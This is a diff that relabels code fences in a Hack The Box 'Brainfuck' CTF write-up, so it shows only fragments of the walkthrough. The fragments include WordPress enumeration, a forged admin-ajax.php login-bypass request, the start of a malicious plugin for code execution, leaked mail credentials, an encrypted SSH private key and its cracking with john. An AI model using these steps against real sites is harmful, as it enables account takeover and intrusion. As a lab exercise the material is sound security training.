@@ -10,7 +10,7 @@ image: "/assets/img/brainfuck/feature.png"
 
 As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.
 
-```python
+```c
 ┌─[george@parrot]─[~/HTB/boxes/brainfuck]
 └──╼ $ sudo nmap -p- --min-rate 10000 -oA nmap/all_ports 10.10.10.17
 [sudo] password for george:
@@ -83,7 +83,7 @@ Also we are able to pick up an email address `orestis@brainfuck.htb`
 
 Since we are sure this is a wordpress site, instead of running directory bruteforce, lets run `wpscan`. The box is quite old hence we are sure to get a tonn of vulnerabilities hence we will ignore anything on the wordpress core
 
-```python
+```c
 ┌─[✗]─[george@parrot]─[~/HTB/boxes/brainfuck]                  
 └──╼ $ wpscan --url https://brainfuck.htb --enumerate ap --disable-tls-checks
 _______________________________________________________________
@@ -138,7 +138,7 @@ One name keeps poping up on these sites and that is `orestis`. Must be an import
 
 Connecting to smtp using telnet is a success and we are able to verify user `orestis` but not `admin`
 
-```python
+```c
 ┌─[george@parrot]─[~/HTB/boxes/brainfuck]
 └──╼ $ telnet 10.10.10.17 25
 Trying 10.10.10.17...
@@ -158,7 +158,7 @@ VRFY orestis
 
 I will check for any vulnerability on the `wp support plus` plugin version from `searchsploit`.
 
-```python
+```c
 ┌─[george@parrot]─[~/HTB/boxes/brainfuck]
 └──╼ $ searchsploit wp support plus
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -173,7 +173,7 @@ Shellcodes: No Results
 ```
 Lets check out the Privilage Escalation first
 
-```
+```c
 ┌─[george@parrot]─[~/HTB/boxes/brainfuck]
 └──╼ $ searchsploit -x php/webapps/41006.txt
 
@@ -212,7 +212,7 @@ I will proxy this to `BurpSuite` so that i can see whats happening behind the sc
 
 The `html` page generates a POST request as below
 
-```
+```php
 POST /wp-admin/admin-ajax.php HTTP/1.1
 Host: brainfuck.htb
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
@@ -229,7 +229,7 @@ username=admin&email=sth&action=loginGuestFacebook
 ```
 Intercepting the response to this `POST` shows it setting a bunch of cookies.
 
-```
+```php
 HTTP/1.1 200 OK
 Server: nginx/1.10.0 (Ubuntu)
 Date: Sun, 24 Sep 2023 09:57:10 GMT
@@ -257,7 +257,7 @@ At this point I figured out why not test for an Remote Code Execution. Below is 
 
 I created a new plugin and named it as george.php
 
-```
+```php
 <?php
  /*
  Plugin Name: george Plugin
@@ -309,7 +309,7 @@ With the smtp credentials obtained, we can login to `orestis'` email and see wha
 
 I dont have any mail client installed on my box hence I will just use the command line
 
-```
+```c
 ┌─[george@parrot]─[~/HTB/boxes/brainfuck]
 └──╼ $ telnet 10.10.10.17 110
 Trying 10.10.10.17...
@@ -323,7 +323,7 @@ PASS kHGuERB29DNiNE
 ```
 We can see he has 2 emails in his mailbox
 
-```
+```c
 LIST
 +OK 2 messages:
 1 977
@@ -428,7 +428,7 @@ Testing out the three options, I find the correct key to be `fuckmybrains`.
 
 The full message goes like
 
-```
+```yaml
 orestis: Hey give me the url for my key bitch :)
 admin: Say please and i just might do so…
 orestis: Pleeeease….
@@ -440,7 +440,7 @@ orestis: No problem, I’ll brute force it ;)
 
 We can now download the ssh key and gain our foothold on the box.
 
-```
+```c
 ─[✗]─[george@parrot]─[~/HTB/boxes/brainfuck]
 └──╼ $ wget https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --no-check-certificate
 --2023-09-24 16:34:21--  https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
@@ -459,7 +459,7 @@ id_rsa                                                          100%[===========
 ```
 But wait.. one problem, the key is encrypted, we will need to tbruteforce it as Orestis suggested.
 
-```
+```c
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382
@@ -494,7 +494,7 @@ EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
 ```
 for this I will use `ssh2john` to generate a hash and crack it with `john`
 
-```
+```c
 ┌─[✗]─[george@parrot]─[~/HTB/boxes/brainfuck]
 └──╼ $ python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
 ┌─[george@parrot]─[~/HTB/boxes/brainfuck]
@@ -516,7 +516,7 @@ Session completed
 
 We cracked the key as `3poulakia!`. With that we can now access the box.
 
-```
+```c
 ┌─[george@parrot]─[~/HTB/boxes/brainfuck]
 └──╼ $ chmod 600 id_rsa
 
@@ -543,7 +543,7 @@ orestis@brainfuck:~$
 ```
 And grab our `user` flags
 
-```
+```c
 orestis@brainfuck:~$ cat user.txt
 2c11cfbc5b959f*********************
 orestis@brainfuck:~$
@@ -609,7 +609,7 @@ I modified the script to add our variables from the txt files
 
 Executing the script, I get plaintext as large integers.
 
-```
+```c
 ┌─[george@parrot]─[~/HTB/boxes/brainfuck]
 └──╼ $ python rsa.py
 n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
